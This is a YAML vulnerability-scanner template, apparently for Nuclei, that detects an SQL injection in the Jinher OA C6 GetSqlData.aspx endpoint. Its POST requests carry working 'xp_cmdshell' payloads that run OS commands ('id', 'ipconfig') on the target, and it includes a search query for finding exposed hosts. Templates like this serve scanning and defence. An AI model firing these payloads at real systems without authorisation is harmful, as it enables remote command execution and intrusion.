@@ -1,0 +1,47 @@
+id: jinher-oa-c6-getSqlData-sqli
+
+info:
+  name: 金和 OA c6 GetSqlData.aspx - sqli
+  author: leadlife
+  severity: critical
+  description:
+  reference:
+    - todo
+  metadata:
+    veified: true
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+  tags: jinher,sqli,oa
+
+http:
+  - raw:
+      - |
+        POST /C6/Control/GetSqlData.aspx/.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Content-Type: text/plain
+        Accept-Encoding: gzip
+
+        exec master..xp_cmdshell 'id'
+      
+      - |
+        POST /C6/Control/GetSqlData.aspx/.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Content-Type: text/plain
+        Accept-Encoding: gzip
+
+        exec master..xp_cmdshell 'ipconfig'
+    
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "Windows IP"
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+        condition: or
+
+      - type: status
+        status:
+          - 200
